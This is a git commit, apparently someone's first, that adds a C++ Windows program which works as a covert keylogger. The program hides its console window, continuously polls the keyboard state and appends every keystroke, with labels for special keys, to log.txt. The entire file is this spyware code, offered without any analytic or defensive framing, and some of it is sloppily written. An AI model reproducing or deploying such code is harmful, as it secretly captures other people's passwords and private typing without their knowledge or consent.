67734904be7beb94246ab7f93ef04e4d6e88da03
Shubhangi Singh <singhshubhangi211@gmail.com>
2020-06-13 12:22:27 +0530

    My first commit

---
+++ main.cpp
@@ -0,0 +1,58 @@
+#include <iostream>
+#include <windows.h>
+
+using namespace std;
+
+int Save(int _key, char *file);
+
+int main(){
+    FreeConsole();
+
+    char i;
+    while(true) {
+    Sleep(10);
+    for(i=8; i<=255; i++) {
+        if(GetAsyncKeyState(i)== -32767){
+            Save(i, "log.txt");
+        }
+    }
+
+} 
+return 0;
+}
+
+int Save(int _key, char *file) {
+    cout<< _key << endl;
+    Sleep(10);
+    FILE *OUTPUT_FILE;
+    OUTPUT_FILE = fopen(file, "a+");
+    switch(_key)
+    {
+        case VK_SHIFT: fprintf(OUTPUT_FILE, "[SHIFT]");
+            break;
+        case VK_BACK: fprintf(OUTPUT_FILE, "[BACKSPACE]");
+            break;
+        case VK_LBUTTON: fprintf(OUTPUT_FILE, "[LBUTTON]");
+            break;
+        case VK_RBUTTON: fprintf(OUTPUT_FILE, "[RBUTTON]");
+            break;
+        case VK_RETURN: fprintf(OUTPUT_FILE, "[RETURN]");
+            break;
+        case VK_TAB: fprintf(OUTPUT_FILE, "[TAB]");
+            break;
+        case VK_ESCAPE: fprintf(OUTPUT_FILE, "[ESCAPE]");
+            break;
+        case VK_CONTROL: fprintf(OUTPUT_FILE, "[Ctrl]");
+            break;
+        case VK_MENU: fprintf(OUTPUT_FILE, "[Alt]");
+            break;
+        case VK_CAPITAL: fprintf(OUTPUT_FILE, "[CAPS Lock]");
+            break;
+        case VK_SPACE: fprintf(OUTPUT_FILE, "[SPACE]");
+            break;
+            
+    }
+    fprintf(OUTPUT_FILE, "%s", &_key);
+    fclose(OUTPUT_FILE);
+    return 0;
+}
